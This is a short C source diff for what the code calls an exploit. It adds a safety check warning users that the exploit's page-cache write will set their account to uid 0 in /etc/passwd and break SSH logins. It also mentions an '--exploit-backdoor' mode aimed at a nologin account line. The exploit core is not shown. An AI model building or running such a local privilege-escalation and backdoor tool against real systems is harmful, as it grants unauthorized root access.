@@ -260,6 +260,38 @@ gid_t real_gid_for_target(void)
     return (gid_t)outer;
 }
 
+bool ssh_lockout_check(const char *target_user)
+{
+    const char *ssh_conn = getenv("SSH_CONNECTION");
+    if (!ssh_conn || !*ssh_conn) return true;     /* not over SSH */
+
+    const char *user = getenv("USER");
+    if (!user) {
+        struct passwd *pw = getpwuid(real_uid_for_target());
+        user = pw ? pw->pw_name : "";
+    }
+    if (strcmp(user, target_user) != 0) return true;  /* different user */
+
+    log_warn("=================================================================");
+    log_warn(" SSH LOCKOUT WARNING");
+    log_warn("=================================================================");
+    log_warn(" You are running this exploit OVER SSH against your OWN account.");
+    log_warn(" The page-cache write will mark '%s' as uid 0 in /etc/passwd.",
+             target_user);
+    log_warn(" Once that lands:");
+    log_warn("   - sshd looks up '%s', sees uid 0", target_user);
+    log_warn("   - StrictModes rejects ~/.ssh/authorized_keys (owner uid 1000");
+    log_warn("     != logging-in uid 0) → publickey auth fails");
+    log_warn("   - PAM password auth also fails (uid mismatch)");
+    log_warn(" Recovery requires console access to drop_caches or reboot.");
+    log_warn(" If this is what you want, type YES_BREAK_SSH below.");
+    log_warn(" Otherwise consider --exploit-backdoor (targets a nologin line");
+    log_warn(" instead of your account, doesn't break SSH).");
+    log_warn("=================================================================");
+
+    return typed_confirm("YES_BREAK_SSH");
+}
+
 int open_and_cache(const char *path)
 {
     int fd = open(path, O_RDONLY);
